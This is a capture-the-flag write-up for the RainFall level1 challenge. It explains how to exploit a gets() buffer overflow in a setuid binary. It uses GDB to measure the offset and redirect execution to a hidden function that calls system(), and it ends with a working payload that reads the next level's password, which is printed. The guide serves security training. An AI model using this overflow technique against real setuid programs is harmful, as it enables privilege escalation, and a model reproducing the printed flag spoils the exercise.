The vulnerability we are trying to exlpoit here is a buffer overflow. The idea is pretty simple, we are trying to overflow a buffer (duh) to insert code or take control of the execution of the binary and get the owner's file permissions

The binary we have has the following permission :
```
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
```

And behave like so :
```
level1@RainFall:~$ ./level1 s
s
level1@RainFall:~$ ./level1
coucou
level1@RainFall:~$ ./level1

level1@RainFall:~$
```

So similar to level0, the goal is to take advantage of the +s permission.

Using GDB to get more informations, we can find :
```
level1@RainFall:~$ gdb ./level1 
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:		push   %ebp
   0x08048481 <+1>:		mov    %esp,%ebp
   0x08048483 <+3>:		and    $0xfffffff0,%esp
   0x08048486 <+6>:		sub    $0x50,%esp
   0x08048489 <+9>:		lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
```

We can see the function `gets` is called. This function is know to be a major security breach, so we have our clue.
`gets` is considered to be a dangerous function to use because it unaware of the buffer capacity, which can (and will) be corrupted out of bounds by long user input. The function continues reading until finding a newline or a EOF.

We are going to need to figure out the capacity of the buffer to overflow it.

Let's get back to GDB.
First let's figure out how long our buffer is. In these line :
```
   0x08048486 <+6>:		sub    $0x50,%esp
   0x08048489 <+9>:		lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
```
we can read 0x50 (80 in decimal) octets are reserved on the stack. Then the `lea` instruction compute the address of the start of the buffer, so at 0x10 (16 in decimal). So the size of our buffer is 64 octets.

But we still need to figure out a way to gain access to level2.
Let's look at the functions on the binary :
```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run						<--- HERE
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

We can notice the `run` function, it's not a libc function, and it doesn't appear in the `disas main`.
If we disassemble it we get :
```
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:		push   %ebp
   0x08048445 <+1>:		mov    %esp,%ebp
   0x08048447 <+3>:		sub    $0x18,%esp
   0x0804844a <+6>:		mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt> <--- HERE
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.
```
And we find our winner, we have the `system` function. 
So our goal is the send to address of the `run` function in the buffer overflow, so the `run` function executes.

Let's try with a 64 octets buffer. We will use python to write the right number of character and to be able to write a memory address :
```
level1@RainFall:~$ python -c "print 'A'*64 + '\x44\x84\x04\x08'" | ./level1
level1@RainFall:~$ 
```

So nothing happens, the buffer size is probably wrong. If we go back to GDB, we can get more information. If you set a breakpoint right before the program ends, we can look at memory address inside the frame of the program
```
level1@RainFall:~$ gdb ./level1 
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
(gdb) break *0x08048495
Breakpoint 1 at 0x8048495
(gdb) run
Starting program: /home/user/level1/level1 
AAAABBBBCCCCDDDDEEEE

Breakpoint 1, 0x08048495 in main ()
(gdb) info frame
Stack level 0, frame at 0xbffff740:
 eip = 0x8048495 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff738, args: 
 Locals at 0xbffff738, Previous frame's sp is 0xbffff740
 Saved registers:
  ebp at 0xbffff738, eip at 0xbffff73c <--- HERE
```
We get the memory address where the processor will get it's next instruction. Now we need to get what's currently in the stack :
```
(gdb) x/24wx $esp
0xbffff6e0:	0xbffff6f0	0x0000002f	0xbffff73c	0xb7fd0ff4
0xbffff6f0:	0x41414141	0x42424242	0x43434343	0x44444444
0xbffff700:	0x45454545	0x00000000	0x0804978c	0x080484c1
0xbffff710:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff720:	0xb7fed280	0x00000000	0x080484a9	0xb7fd0ff4
0xbffff730:	0x080484a0	0x00000000	0x00000000	0xb7e454d3
```

The `x/24` command will print the 24 blocs of 4 octet in hex from the pointeur on the stack. `$esp` is the registre that always points on the top of the stack. Finally the `wx` prints the result in hex (x) and each unit is a 4 octet word (w).

So we inputed `AAAABBBBCCCCDDDDEEEE` in the program, to see where the buffer start we will look for the hex unit representing the `AAAA` (`0x41414141` in hex) and we get the memory address of the start of the buffer
:
```
0xbffff6f0
``` 
We can now compute the actual size of the buffer :
```
(gdb) p/d 0xbffff73c - 0xbffff6f0
$1 = 76
```

Let's try the buffer overflow with the correct buffer lenght :
```
level1@RainFall:~$ python -c "print 'A'*76 + '\x44\x84\x04\x08'" | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Ok progress ! We got input from the `run` function, so we know we hit the right memory spot. The problem lies in the pipe of the input. Once the `run` function executes, the pipe is closed and it cannot open a shell or other things that would allow us to get access. We need to use a command that will leave the pipe open. The cat command has this property so let's try that :
```
level1@RainFall:~$ (python -c "print 'A'*76 + '\x44\x84\x04\x08'"; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
And we got the flag !
